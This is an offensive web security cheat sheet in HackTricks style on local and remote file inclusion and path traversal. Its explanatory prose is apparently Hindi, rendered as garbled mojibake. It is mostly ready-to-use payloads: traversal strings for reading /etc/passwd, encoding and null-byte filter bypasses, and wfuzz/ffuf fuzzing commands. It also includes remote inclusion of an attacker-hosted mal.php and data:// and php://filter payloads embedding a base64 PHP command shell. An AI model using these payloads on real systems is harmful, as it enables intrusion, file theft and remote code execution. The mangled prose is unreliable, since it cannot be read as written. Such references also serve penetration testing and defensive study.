# рдлрд╛рдЗрд▓ рдЗрдирдХреНрд▓реВрдЬрди/рдкрд╛рде рдЯреНрд░реИрд╡рд░реНрд╕рд▓

<details>

<summary><strong>AWS рд╣реИрдХрд┐рдВрдЧ рд╕реАрдЦреЗрдВ рд╢реВрдиреНрдп рд╕реЗ рд▓реЗрдХрд░ рд╣реАрд░реЛ рддрдХ</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong> рдХреЗ рд╕рд╛рде!</strong></summary>

HackTricks рдХрд╛ рд╕рдорд░реНрдерди рдХрд░рдиреЗ рдХреЗ рдЕрдиреНрдп рддрд░реАрдХреЗ:

* рдпрджрд┐ рдЖрдк рдЪрд╛рд╣рддреЗ рд╣реИрдВ рдХрд┐ рдЖрдкрдХреА **рдХрдВрдкрдиреА рдХрд╛ рд╡рд┐рдЬреНрдЮрд╛рдкрди HackTricks рдореЗрдВ рджрд┐рдЦрд╛рдИ рджреЗ** рдпрд╛ **HackTricks рдХреЛ PDF рдореЗрдВ рдбрд╛рдЙрдирд▓реЛрдб рдХрд░реЗрдВ**, рддреЛ [**рд╕рдмреНрд╕рдХреНрд░рд┐рдкреНрд╢рди рдкреНрд▓рд╛рдиреНрд╕**](https://github.com/sponsors/carlospolop) рджреЗрдЦреЗрдВ!
* [**рдЖрдзрд┐рдХрд╛рд░рд┐рдХ PEASS & HackTricks рд╕реНрд╡реИрдЧ**](https://peass.creator-spring.com) рдкреНрд░рд╛рдкреНрдд рдХрд░реЗрдВ
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family) рдХреА рдЦреЛрдЬ рдХрд░реЗрдВ, рд╣рдорд╛рд░рд╛ рд╡рд┐рд╢реЗрд╖ [**NFTs**](https://opensea.io/collection/the-peass-family) рд╕рдВрдЧреНрд░рд╣
* ЁЯТм [**Discord рд╕рдореВрд╣**](https://discord.gg/hRep4RUj7f) рдореЗрдВ **рд╢рд╛рдорд┐рд▓ рд╣реЛрдВ** рдпрд╛ [**рдЯреЗрд▓реАрдЧреНрд░рд╛рдо рд╕рдореВрд╣**](https://t.me/peass) рдореЗрдВ рдпрд╛ **Twitter** ЁЯРж рдкрд░ рдореБрдЭреЗ **рдлреЙрд▓реЛ** рдХрд░реЗрдВ [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
* [**HackTricks**](https://github.com/carlospolop/hacktricks) рдФрд░ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github рд░реЗрдкреЛрдЬрд╝ рдореЗрдВ PRs рд╕рдмрдорд┐рдЯ рдХрд░рдХреЗ рдЕрдкрдиреА рд╣реИрдХрд┐рдВрдЧ рдЯреНрд░рд┐рдХреНрд╕ рд╕рд╛рдЭрд╛ рдХрд░реЗрдВред

</details>

<figure><img src="../../.gitbook/assets/image (1) (3) (1).png" alt=""><figcaption></figcaption></figure>

[**HackenProof Discord**](https://discord.com/invite/N3FrSbmwdy) рд╕рд░реНрд╡рд░ рдореЗрдВ рд╢рд╛рдорд┐рд▓ рд╣реЛрдВ рдФрд░ рдЕрдиреБрднрд╡реА рд╣реИрдХрд░реНрд╕ рдФрд░ рдмрдЧ рдмрд╛рдЙрдВрдЯреА рд╣рдВрдЯрд░реНрд╕ рдХреЗ рд╕рд╛рде рд╕рдВрд╡рд╛рдж рдХрд░реЗрдВ!

**рд╣реИрдХрд┐рдВрдЧ рдЗрдирд╕рд╛рдЗрдЯреНрд╕**\
рд╣реИрдХрд┐рдВрдЧ рдХреЗ рд░реЛрдорд╛рдВрдЪ рдФрд░ рдЪреБрдиреМрддрд┐рдпреЛрдВ рдХреЗ рдмрд╛рд░реЗ рдореЗрдВ рдЧрд╣рд░рд╛рдИ рд╕реЗ рдЬрд╛рдирдХрд╛рд░реА рдкреНрд░рд╛рдкреНрдд рдХрд░реЗрдВ

**рд░рд┐рдпрд▓-рдЯрд╛рдЗрдо рд╣реИрдХ рдиреНрдпреВрдЬрд╝**\
рд░рд┐рдпрд▓-рдЯрд╛рдЗрдо рдиреНрдпреВрдЬрд╝ рдФрд░ рдЗрдирд╕рд╛рдЗрдЯреНрд╕ рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ рд╣реИрдХрд┐рдВрдЧ рдХреА рддреЗрдЬрд╝-рд░рдлрд╝реНрддрд╛рд░ рджреБрдирд┐рдпрд╛ рдХреЗ рд╕рд╛рде рдЕрдкрдбреЗрдЯ рд░рд╣реЗрдВ

**рдирд╡реАрдирддрдо рдШреЛрд╖рдгрд╛рдПрдБ**\
рдирд╡реАрдирддрдо рдмрдЧ рдмрд╛рдЙрдВрдЯреАрдЬрд╝ рд▓реЙрдиреНрдЪрд┐рдВрдЧ рдФрд░ рдорд╣рддреНрд╡рдкреВрд░реНрдг рдкреНрд▓реЗрдЯрдлреЙрд░реНрдо рдЕрдкрдбреЗрдЯреНрд╕ рдХреЗ рд╕рд╛рде рд╕реВрдЪрд┐рдд рд░рд╣реЗрдВ

[**Discord**](https://discord.com/invite/N3FrSbmwdy) рдкрд░ **рд╣рдорд╕реЗ рдЬреБрдбрд╝реЗрдВ** рдФрд░ рдЖрдЬ рд╣реА рд╢реАрд░реНрд╖ рд╣реИрдХрд░реНрд╕ рдХреЗ рд╕рд╛рде рд╕рд╣рдпреЛрдЧ рдХрд░рдирд╛ рд╢реБрд░реВ рдХрд░реЗрдВ!

## рдлрд╛рдЗрд▓ рдЗрдирдХреНрд▓реВрдЬрди

**рд░рд┐рдореЛрдЯ рдлрд╛рдЗрд▓ рдЗрдирдХреНрд▓реВрдЬрди (RFI):** рдлрд╛рдЗрд▓ рдПрдХ рджреВрд░рд╕реНрде рд╕рд░реНрд╡рд░ рд╕реЗ рд▓реЛрдб рдХреА рдЬрд╛рддреА рд╣реИ (рд╕рд░реНрд╡рд╢реНрд░реЗрд╖реНрда: рдЖрдк рдХреЛрдб рд▓рд┐рдЦ рд╕рдХрддреЗ рд╣реИрдВ рдФрд░ рд╕рд░реНрд╡рд░ рдЗрд╕реЗ рдирд┐рд╖реНрдкрд╛рджрд┐рдд рдХрд░реЗрдЧрд╛)ред PHP рдореЗрдВ рдпрд╣ рдбрд┐рдлрд╝реЙрд▓реНрдЯ рд░реВрдк рд╕реЗ **рдЕрдХреНрд╖рдо** рд╣реИ (**allow\_url\_include**).\
**рд▓реЛрдХрд▓ рдлрд╛рдЗрд▓ рдЗрдирдХреНрд▓реВрдЬрди (LFI):** рд╕рд░реНрд╡рд░ рдПрдХ рд╕реНрдерд╛рдиреАрдп рдлрд╛рдЗрд▓ рд▓реЛрдб рдХрд░рддрд╛ рд╣реИред

рдЬрдм рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдХрд┐рд╕реА рддрд░рд╣ рд╕реЗ рдЙрд╕ рдлрд╛рдЗрд▓ рдХреЛ рдирд┐рдпрдВрддреНрд░рд┐рдд рдХрд░ рд╕рдХрддрд╛ рд╣реИ рдЬреЛ рд╕рд░реНрд╡рд░ рджреНрд╡рд╛рд░рд╛ рд▓реЛрдб рдХреА рдЬрд╛ рд░рд╣реА рд╣реИ, рддрдм рдпрд╣ рднреЗрджреНрдпрддрд╛ рд╣реЛрддреА рд╣реИред

рднреЗрджреНрдп **PHP рдлрдВрдХреНрд╢рдиреНрд╕**: require, require\_once, include, include\_once

рдЗрд╕ рднреЗрджреНрдпрддрд╛ рдХрд╛ рд▓рд╛рдн рдЙрдард╛рдиреЗ рдХреЗ рд▓рд┐рдП рдПрдХ рджрд┐рд▓рдЪрд╕реНрдк рдЙрдкрдХрд░рдг: [https://github.com/kurobeats/fimap](https://github.com/kurobeats/fimap)

## рдмреНрд▓рд╛рдЗрдВрдб - рдЗрдВрдЯрд░реЗрд╕реНрдЯрд┐рдВрдЧ - LFI2RCE рдлрд╛рдЗрд▓реНрд╕
```python
wfuzz -c -w ./lfi2.txt --hw 0 http://10.10.10.10/nav.php?page=../../../../../../../FUZZ
```
### **Linux**

**рдХрдИ \*nix LFI рд╕реВрдЪрд┐рдпреЛрдВ рдХреЛ рдорд┐рд▓рд╛рдХрд░ рдФрд░ рдЕрдзрд┐рдХ рдкрде рдЬреЛрдбрд╝рдХрд░ рдореИрдВрдиреЗ рдпрд╣ рдмрдирд╛рдИ рд╣реИ:**

{% embed url="https://github.com/carlospolop/Auto_Wordlists/blob/main/wordlists/file_inclusion_linux.txt" %}

`/` рдХреЛ `\` рд╕реЗ рдмрджрд▓рдиреЗ рдХрд╛ рднреА рдкреНрд░рдпрд╛рд╕ рдХрд░реЗрдВ\
`../../../../../` рдЬреЛрдбрд╝рдиреЗ рдХрд╛ рднреА рдкреНрд░рдпрд╛рд╕ рдХрд░реЗрдВ

рдлрд╝рд╛рдЗрд▓ /etc/password рдХреЛ рдвреВрдБрдврдиреЗ рдХреЗ рд▓рд┐рдП рдХрдИ рддрдХрдиреАрдХреЛрдВ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдиреЗ рд╡рд╛рд▓реА рд╕реВрдЪреА (рдЬрд╛рдВрдЪрдиреЗ рдХреЗ рд▓рд┐рдП рдХрд┐ рдХрдордЬреЛрд░реА рдореМрдЬреВрдж рд╣реИ рдпрд╛ рдирд╣реАрдВ) [рдпрд╣рд╛рдБ](https://github.com/xmendez/wfuzz/blob/master/wordlist/vulns/dirTraversal-nix.txt) рдкрд╛рдИ рдЬрд╛ рд╕рдХрддреА рд╣реИ

### **Windows**

рдХрдИ рд╕реВрдЪрд┐рдпреЛрдВ рдХреЛ рдорд┐рд▓рд╛рдХрд░ рдореИрдВрдиреЗ рдмрдирд╛рдИ рд╣реИ:

{% embed url="https://github.com/carlospolop/Auto_Wordlists/blob/main/wordlists/file_inclusion_windows.txt" %}

`/` рдХреЛ `\` рд╕реЗ рдмрджрд▓рдиреЗ рдХрд╛ рднреА рдкреНрд░рдпрд╛рд╕ рдХрд░реЗрдВ\
`C:/` рдХреЛ рд╣рдЯрд╛рдХрд░ `../../../../../` рдЬреЛрдбрд╝рдиреЗ рдХрд╛ рднреА рдкреНрд░рдпрд╛рд╕ рдХрд░реЗрдВ

рдлрд╝рд╛рдЗрд▓ /boot.ini рдХреЛ рдвреВрдБрдврдиреЗ рдХреЗ рд▓рд┐рдП рдХрдИ рддрдХрдиреАрдХреЛрдВ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдиреЗ рд╡рд╛рд▓реА рд╕реВрдЪреА (рдЬрд╛рдВрдЪрдиреЗ рдХреЗ рд▓рд┐рдП рдХрд┐ рдХрдордЬреЛрд░реА рдореМрдЬреВрдж рд╣реИ рдпрд╛ рдирд╣реАрдВ) [рдпрд╣рд╛рдБ](https://github.com/xmendez/wfuzz/blob/master/wordlist/vulns/dirTraversal-win.txt) рдкрд╛рдИ рдЬрд╛ рд╕рдХрддреА рд╣реИ

### **OS X**

Linux рдХреА LFI рд╕реВрдЪреА рдХреА рдЬрд╛рдВрдЪ рдХрд░реЗрдВред

## Basic LFI and bypasses

рд╕рднреА рдЙрджрд╛рд╣рд░рдг Local File Inclusion рдХреЗ рд▓рд┐рдП рд╣реИрдВ рд▓реЗрдХрд┐рди Remote File Inclusion рдкрд░ рднреА рд▓рд╛рдЧреВ рдХрд┐рдП рдЬрд╛ рд╕рдХрддреЗ рд╣реИрдВ (page=[http://myserver.com/phpshellcode.txt\\](http://myserver.com/phpshellcode.txt\)/).
```
http://example.com/index.php?page=../../../etc/passwd
```
### рдЯреНрд░реИрд╡рд░реНрд╕рд▓ рд╕реАрдХреНрд╡реЗрдВрд╕реЗрд╕ рдиреЙрди-рд░рд┐рдХрд░реНрд╕рд┐рд╡рд▓реА рд╕реНрдЯреНрд░рд┐рдкреНрдб
```python
http://example.com/index.php?page=....//....//....//etc/passwd
http://example.com/index.php?page=....\/....\/....\/etc/passwd
http://some.domain.com/static/%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c/etc/passwd
```
### **Null byte (%00)**

рдкреНрд░рджрд╛рди рдХрд┐рдП рдЧрдП рд╕реНрдЯреНрд░рд┐рдВрдЧ рдХреЗ рдЕрдВрдд рдореЗрдВ рдФрд░ рдЕрдХреНрд╖рд░ рдЬреЛрдбрд╝рдиреЗ рдХреЛ рдмрд╛рдпрдкрд╛рд╕ рдХрд░реЗрдВ (рдмрд╛рдпрдкрд╛рд╕: $\_GET\['param']."php")
```
http://example.com/index.php?page=../../../etc/passwd%00
```
рдпрд╣ **PHP 5.4 рдХреЗ рдмрд╛рдж рд╕реЗ рд╣рд▓ рдХрд┐рдпрд╛ рдЬрд╛ рдЪреБрдХрд╛ рд╣реИ**

### **рдПрдиреНрдХреЛрдбрд┐рдВрдЧ**

рдЖрдк рдбрдмрд▓ URL рдПрдиреНрдХреЛрдб (рдФрд░ рдЕрдиреНрдп) рдЬреИрд╕реЗ рдЧреИрд░-рдорд╛рдирдХ рдПрдиреНрдХреЛрдбрд┐рдВрдЧреНрд╕ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ:
```
http://example.com/index.php?page=..%252f..%252f..%252fetc%252fpasswd
http://example.com/index.php?page=..%c0%af..%c0%af..%c0%afetc%c0%afpasswd
http://example.com/index.php?page=%252e%252e%252fetc%252fpasswd
http://example.com/index.php?page=%252e%252e%252fetc%252fpasswd%00
```
### рдореМрдЬреВрджрд╛ рдлреЛрд▓реНрдбрд░ рд╕реЗ

рд╣реЛ рд╕рдХрддрд╛ рд╣реИ рдХрд┐ рдмреИрдХ-рдПрдВрдб рдлреЛрд▓реНрдбрд░ рдкрде рдХреА рдЬрд╛рдВрдЪ рдХрд░ рд░рд╣рд╛ рд╣реЛ:
```python
http://example.com/index.php?page=utils/scripts/../../../../../etc/passwd
```
### рд╕рд░реНрд╡рд░ рдкрд░ рдлреЛрд▓реНрдбрд░реНрд╕ рдХреА рдкрд╣рдЪрд╛рди рдХрд░рдирд╛

рдПрдкреНрд▓рд┐рдХреЗрдЯрд┐рд╡ рдХреЛрдб / рдЕрдиреБрдордд рд╡рд░реНрдгреЛрдВ рдХреЗ рдЖрдзрд╛рд░ рдкрд░, рдлрд╛рдЗрд▓ рд╕рд┐рд╕реНрдЯрдо рдХреЛ рдкреБрдирд░рд╛рд╡реГрддреНрддрд┐ рд╕реЗ рдПрдХреНрд╕рдкреНрд▓реЛрд░ рдХрд░рдирд╛ рд╕рдВрднрд╡ рд╣реЛ рд╕рдХрддрд╛ рд╣реИ рдЬрд┐рд╕рдореЗрдВ рдХреЗрд╡рд▓ рдлрд╛рдЗрд▓реНрд╕ рд╣реА рдирд╣реАрдВ рдмрд▓реНрдХрд┐ рдлреЛрд▓реНрдбрд░реНрд╕ рдХреА рдЦреЛрдЬ рднреА рд╢рд╛рдорд┐рд▓ рд╣реИред рдРрд╕рд╛ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП:

* рдЖрдкрдХреА рд╡рд░реНрддрдорд╛рди рдбрд╛рдпрд░реЗрдХреНрдЯрд░реА рдХреА "рдЧрд╣рд░рд╛рдИ" рдХреА рдкрд╣рдЪрд╛рди рдХрд░реЗрдВ, рдпрджрд┐ рдЖрдк Linux рдкрд░ рд╣реИрдВ рддреЛ `/etc/passwd` рдХреЛ рд╕рдлрд▓рддрд╛рдкреВрд░реНрд╡рдХ рдкреНрд░рд╛рдкреНрдд рдХрд░рдХреЗ:
```
http://example.com/index.php?page=../../../etc/passwd # depth of 3
```
* рд╡рд░реНрддрдорд╛рди рдбрд╛рдпрд░реЗрдХреНрдЯрд░реА рдореЗрдВ рдПрдХ рдлреЛрд▓реНрдбрд░ рдХрд╛ рдирд╛рдо рдЕрдиреБрдорд╛рди рд▓рдЧрд╛рдиреЗ рдХрд╛ рдкреНрд░рдпрд╛рд╕ рдХрд░реЗрдВ, рдлреЛрд▓реНрдбрд░ рдХрд╛ рдирд╛рдо рдЬреЛрдбрд╝рдХрд░ (рдпрд╣рд╛рдБ, `private`), рдФрд░ рдлрд┐рд░ `/etc/passwd` рдореЗрдВ рд╡рд╛рдкрд╕ рдЬрд╛рдПрдБ:
```
http://example.com/index.php?page=private/../../../../etc/passwd # we went deeper down one level, so we have to go 3+1=4 levels up to go back to /etc/passwd
```
* рдпрджрд┐ рдПрдкреНрд▓рд┐рдХреЗрд╢рди рд╕рдВрд╡реЗрджрдирд╢реАрд▓ рд╣реИ, рддреЛ рдЕрдиреБрд░реЛрдз рдХреЗ рджреЛ рдЕрд▓рдЧ-рдЕрд▓рдЧ рдкрд░рд┐рдгрд╛рдо рд╣реЛ рд╕рдХрддреЗ рд╣реИрдВ:
* рдпрджрд┐ рдЖрдкрдХреЛ рдПрдХ рддреНрд░реБрдЯрд┐ / рдХреЛрдИ рдЖрдЙрдЯрдкреБрдЯ рдирд╣реАрдВ рдорд┐рд▓рддрд╛ рд╣реИ, рддреЛ `private` рдлрд╝реЛрд▓реНрдбрд░ рдЗрд╕ рд╕реНрдерд╛рди рдкрд░ рдореМрдЬреВрдж рдирд╣реАрдВ рд╣реИ
* рдпрджрд┐ рдЖрдкрдХреЛ `/etc/passwd` рд╕реЗ рд╕рд╛рдордЧреНрд░реА рдорд┐рд▓рддреА рд╣реИ, рддреЛ рдЖрдкрдиреЗ рдпрд╣ рд╕рддреНрдпрд╛рдкрд┐рдд рдХрд┐рдпрд╛ рд╣реИ рдХрд┐ рд╡рд╛рд╕реНрддрд╡ рдореЗрдВ рдЖрдкрдХреА рд╡рд░реНрддрдорд╛рди рдирд┐рд░реНрджреЗрд╢рд┐рдХрд╛ рдореЗрдВ рдПрдХ `private` рдлрд╝реЛрд▓реНрдбрд░ рд╣реИ
* рдЗрд╕ рддрдХрдиреАрдХ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рдЖрдкрдиреЗ рдЬреЛ рдлрд╝реЛрд▓реНрдбрд░(рд╕) рдЦреЛрдЬреЗ рд╣реИрдВ, рдЙрдиреНрд╣реЗрдВ рдлрд╝рд╛рдЗрд▓реЛрдВ рдХреЗ рд▓рд┐рдП (рдХреНрд▓рд╛рд╕рд┐рдХ LFI рд╡рд┐рдзрд┐ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ) рдпрд╛ рд╕рдмрдбрд╛рдпрд░реЗрдХреНрдЯрд░реАрдЬрд╝ рдХреЗ рд▓рд┐рдП рдЙрд╕реА рддрдХрдиреАрдХ рдХрд╛ рдкреБрдирд░рд╛рд╡реГрддреНрддрд┐ рд╕реЗ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ fuzzed рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИред

рдлрд╝рд╛рдЗрд▓ рд╕рд┐рд╕реНрдЯрдо рдореЗрдВ рдХрд┐рд╕реА рднреА рд╕реНрдерд╛рди рдкрд░ рдирд┐рд░реНрджреЗрд╢рд┐рдХрд╛рдУрдВ рдХреЛ рдЦреЛрдЬрдиреЗ рдХреЗ рд▓рд┐рдП рдЗрд╕ рддрдХрдиреАрдХ рдХреЛ рдЕрдиреБрдХреВрд▓рд┐рдд рдХрд░рдирд╛ рд╕рдВрднрд╡ рд╣реИред рдЙрджрд╛рд╣рд░рдг рдХреЗ рд▓рд┐рдП, рдпрджрд┐, рдЙрд╕реА рдкрд░рд┐рдХрд▓реНрдкрдирд╛ рдХреЗ рддрд╣рдд (рдлрд╝рд╛рдЗрд▓ рд╕рд┐рд╕реНрдЯрдо рдХреА рдЧрд╣рд░рд╛рдИ 3 рдкрд░ рд╡рд░реНрддрдорд╛рди рдирд┐рд░реНрджреЗрд╢рд┐рдХрд╛) рдЖрдк `/var/www/` рдореЗрдВ `private` рдирд┐рд░реНрджреЗрд╢рд┐рдХрд╛ рд╣реЛрдиреЗ рдХреА рдЬрд╛рдВрдЪ рдХрд░рдирд╛ рдЪрд╛рд╣рддреЗ рд╣реИрдВ, рддреЛ рдирд┐рдореНрдирд▓рд┐рдЦрд┐рдд рдкреЗрд▓реЛрдб рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░реЗрдВ:
```
http://example.com/index.php?page=../../../var/www/private/../../../etc/passwd
```
рдирд┐рдореНрдирд▓рд┐рдЦрд┐рдд рдХрдорд╛рдВрдбреНрд╕ рдХрд╛ рдЕрдиреБрдХреНрд░рдо `sed` (1) рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ payloads рдХреА рдЙрддреНрдкрддреНрддрд┐ рдХреЗ рд▓рд┐рдП рдЕрдиреБрдорддрд┐ рджреЗрддрд╛ рд╣реИ, рдЬрд┐рд╕реЗ `ffuf` (2) рдЬреИрд╕реЗ url fuzzing рдЯреВрд▓реНрд╕ рдХреЗ рд▓рд┐рдП рдЗрдирдкреБрдЯ рдХреЗ рд░реВрдк рдореЗрдВ рдЗрд╕реНрддреЗрдорд╛рд▓ рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИ:
```
$ sed 's_^_../../../var/www/_g' /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-small.txt | sed 's_$_/../../../etc/passwd_g' > payloads.txt
$ ffuf -u http://example.com/index.php?page=FUZZ -w payloads.txt -mr "root"
$ ffuf -u http://owasp.ctf.intigriti.io/FUZZ -w /usr/share/seclists/Discovery/Web-Content/common.txt -mc 200 -e '.php~,.php.old,.php.bak,.php.swp,.php.sav,.php.save'
```
рдмреЗрд╢рдХ, рдЗрди рдкреЗрд▓реЛрдбреНрд╕ рдХреЛ рдЖрдкрдХреА рдЬрд░реВрд░рддреЛрдВ рдХреЗ рдЕрдиреБрд╕рд╛рд░ рдЧрд╣рд░рд╛рдИ / рд╕реНрдерд╛рди / рдЗрдирдкреБрдЯ рдбрд╛рдпрд░реЗрдХреНрдЯрд░реА рд╕реВрдЪреА рдореЗрдВ рд╕рдорд╛рдпреЛрдЬрд┐рдд рдХрд░реЗрдВред

### **рдкрде рд╕рдВрдХреЛрдЪрди**

рдкреНрд░рджрд╛рди рдХреА рдЧрдИ рд╕реНрдЯреНрд░рд┐рдВрдЧ рдХреЗ рдЕрдВрдд рдореЗрдВ рдФрд░ рдЕрдзрд┐рдХ рдЕрдХреНрд╖рд░реЛрдВ рдХреЛ рдЬреЛрдбрд╝рдиреЗ рдХреА рдкреНрд░рдХреНрд░рд┐рдпрд╛ рдХреЛ рдмрд╛рдпрдкрд╛рд╕ рдХрд░реЗрдВ (рдмрд╛рдпрдкрд╛рд╕ рдХрд░реЗрдВ: $\_GET\['param']."php")
```
In PHP: /etc/passwd = /etc//passwd = /etc/./passwd = /etc/passwd/ = /etc/passwd/.
Check if last 6 chars are passwd --> passwd/
Check if last 4 chars are ".php" --> shellcode.php/.
```

```
http://example.com/index.php?page=a/../../../../../../../../../etc/passwd..\.\.\.\.\.\.\.\.\.\.\[ADD MORE]\.\.
http://example.com/index.php?page=a/../../../../../../../../../etc/passwd/././.[ADD MORE]/././.

#With the next options, by trial and error, you have to discover how many "../" are needed to delete the appended string but not "/etc/passwd" (near 2027)

http://example.com/index.php?page=a/./.[ADD MORE]/etc/passwd
http://example.com/index.php?page=a/../../../../[ADD MORE]../../../../../etc/passwd
```
рд╣рдореЗрд╢рд╛ рдкрде рдХреЛ **рд╢реБрд░реВ** рдХрд░рдиреЗ рдХрд╛ рдкреНрд░рдпрд╛рд╕ рдХрд░реЗрдВ **рдПрдХ рдирдХрд▓реА рдбрд╛рдпрд░реЗрдХреНрдЯрд░реА рдХреЗ рд╕рд╛рде** (a/).

**рдпрд╣ рдХрдордЬреЛрд░реА PHP 5.3 рдореЗрдВ рд╕рд╣реА рдХреА рдЧрдИ рдереА.**

### **рдлрд┐рд▓реНрдЯрд░ рдмрд╛рдпрдкрд╛рд╕ рдЯреНрд░рд┐рдХреНрд╕**
```
http://example.com/index.php?page=....//....//etc/passwd
http://example.com/index.php?page=..///////..////..//////etc/passwd
http://example.com/index.php?page=/%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../etc/passwd
Maintain the initial path: http://example.com/index.php?page=/var/www/../../etc/passwd
http://example.com/index.php?page=PhP://filter
```
## рд░рд┐рдореЛрдЯ рдлрд╛рдЗрд▓ рдЗрдирдХреНрд▓реВрдЬрди

php рдореЗрдВ рдпрд╣ рдбрд┐рдлрд╝реЙрд▓реНрдЯ рд░реВрдк рд╕реЗ рдЕрдХреНрд╖рдо рд╣реЛрддрд╛ рд╣реИ рдХреНрдпреЛрдВрдХрд┐ **`allow_url_include`** **рдСрдл** рд╣реЛрддрд╛ рд╣реИред рдЗрд╕реЗ рдХрд╛рдо рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП **рдСрди** рд╣реЛрдирд╛ рдЪрд╛рд╣рд┐рдП, рдФрд░ рдЙрд╕ рд╕реНрдерд┐рддрд┐ рдореЗрдВ рдЖрдк рдЕрдкрдиреЗ рд╕рд░реНрд╡рд░ рд╕реЗ PHP рдлрд╛рдЗрд▓ рдХреЛ рдЗрдирдХреНрд▓реВрдб рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ рдФрд░ RCE рдкреНрд░рд╛рдкреНрдд рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ:
```python
http://example.com/index.php?page=http://atacker.com/mal.php
http://example.com/index.php?page=\\attacker.com\shared\mal.php
```
рдпрджрд┐ рдХрд┐рд╕реА рдХрд╛рд░рдг рд╕реЗ **`allow_url_include`** **On** рд╣реИ, рд▓реЗрдХрд┐рди PHP рдмрд╛рд╣рд░реА рд╡реЗрдмрдкреЗрдЬреЛрдВ рддрдХ рдкрд╣реБрдБрдЪ рдХреЛ **рдлрд╝рд┐рд▓реНрдЯрд░рд┐рдВрдЧ** рдХрд░ рд░рд╣рд╛ рд╣реИ, [рдЗрд╕ рдкреЛрд╕реНрдЯ рдХреЗ рдЕрдиреБрд╕рд╛рд░](https://matan-h.com/one-lfi-bypass-to-rule-them-all-using-base64/), рдЖрдк рдЙрджрд╛рд╣рд░рдг рдХреЗ рд▓рд┐рдП рдбреЗрдЯрд╛ рдкреНрд░реЛрдЯреЛрдХреЙрд▓ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ рдмреЗрд╕64 рдХреЗ рд╕рд╛рде рдПрдХ b64 PHP рдХреЛрдб рдХреЛ рдбрд┐рдХреЛрдб рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдФрд░ RCE рдкреНрд░рд╛рдкреНрдд рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ:

{% code overflow="wrap" %}
```
PHP://filter/convert.base64-decode/resource=data://plain/text,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ZWNobyAnU2hlbGwgZG9uZSAhJzsgPz4+.txt
```
{% endcode %}

{% hint style="info" %}
рдкрд┐рдЫрд▓реЗ рдХреЛрдб рдореЗрдВ, рдЕрдВрддрд┐рдо `+.txt` рдХреЛ рдЬреЛрдбрд╝рд╛ рдЧрдпрд╛ рдХреНрдпреЛрдВрдХрд┐ рд╣рдорд▓рд╛рд╡рд░ рдХреЛ рдПрдХ рд╕реНрдЯреНрд░рд┐рдВрдЧ рдХреА рдЖрд╡рд╢реНрдпрдХрддрд╛ рдереА рдЬреЛ `.txt` рдореЗрдВ рд╕рдорд╛рдкреНрдд рд╣реЛрддреА рд╣реИ, рдЗрд╕рд▓рд┐рдП рд╕реНрдЯреНрд░рд┐рдВрдЧ рдЗрд╕рдХреЗ рд╕рд╛рде рд╕рдорд╛рдкреНрдд рд╣реЛрддреА рд╣реИ рдФрд░ b64 рдбрд┐рдХреЛрдб рдХреЗ рдмрд╛рдж рд╡рд╣ рд╣рд┐рд╕реНрд╕рд╛ рдХреЗрд╡рд▓ рдЕрд░реНрдерд╣реАрди рд╣реЛрдЧрд╛ рдФрд░ рдЕрд╕рд▓реА PHP рдХреЛрдб рд╢рд╛рдорд┐рд▓ рдХрд┐рдпрд╛ рдЬрд╛рдПрдЧрд╛ (рдФрд░ рдЗрд╕рд▓рд┐рдП, рдирд┐рд╖реНрдкрд╛рджрд┐рдд рдХрд┐рдпрд╛ рдЬрд╛рдПрдЧрд╛)ред
{% endhint %}

рдПрдХ рдФрд░ рдЙрджрд╛рд╣рд░рдг **`php://` рдкреНрд░реЛрдЯреЛрдХреЙрд▓ рдХрд╛ рдЙрдкрдпреЛрдЧ рди рдХрд░рддреЗ рд╣реБрдП** рд╣реЛрдЧрд╛:

{% code overflow="wrap" %}
```
data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ZWNobyAnU2hlbGwgZG9uZSAhJzsgPz4+txt
```
{% endcode %}

## Python рдореВрд▓ рддрддреНрд╡

Python рдореЗрдВ рдЗрд╕ рддрд░рд╣ рдХреЗ рдХреЛрдб рдореЗрдВ:
```python
# file_name is controlled by a user
os.path.join(os.getcwd(), "public", file_name)
```
рдпрджрд┐ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ **`file_name`** рдХреЛ **рдПрдХ рд╕рдВрдкреВрд░реНрдг рдкрде** рдкрд╛рд╕ рдХрд░рддрд╛ рд╣реИ, рддреЛ **рдкрд┐рдЫрд▓рд╛ рдкрде рдХреЗрд╡рд▓ рд╣рдЯрд╛ рджрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ**:
```python
os.path.join(os.getcwd(), "public", "/etc/passwd")
'/etc/passwd'
```
